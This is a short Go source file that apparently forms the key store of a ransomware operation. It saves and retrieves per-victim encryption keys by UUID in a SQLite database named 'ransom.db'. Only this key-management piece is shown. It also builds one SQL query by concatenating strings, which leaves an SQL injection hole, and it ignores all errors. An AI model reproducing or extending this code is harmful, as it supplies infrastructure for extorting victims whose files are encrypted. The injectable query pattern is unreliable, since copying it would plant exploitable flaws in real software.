package main

import (
    "database/sql"
    _ "github.com/mattn/go-sqlite3"
)

const (
    ddl_key = `
        CREATE TABLE IF NOT EXISTS keys (
            uuid_16 VARCHAR(45) NOT NULL PRIMARY KEY,
            key_16 VARCHAR(45) NOT NULL
        );
    `

    dml_key_insert = `
        INSERT INTO keys(uuid_16, key_16) VALUES (?, ?)
    `
)

func InitDB() {
    database, _ := sql.Open("sqlite3", "./ransom.db")
    statement, _ := database.Prepare(ddl_key)
    statement.Exec()
    defer database.Close()
}

func KeyInsert(key Key) {
    database, _ := sql.Open("sqlite3", "./ransom.db")
    statement, _ := database.Prepare(dml_key_insert)
    statement.Exec(key.Uuid, key.Key)
    defer database.Close()
}

func KeySelect(key *Key) {
    database, _ := sql.Open("sqlite3", "./ransom.db")
    rows, _ := database.Query("SELECT key_16 FROM keys WHERE uuid_16 = '" + key.Uuid + "'")

    var key_16 string
    for rows.Next() {
        rows.Scan(&key_16)
    }

    key.Key = key_16
    defer database.Close()
}
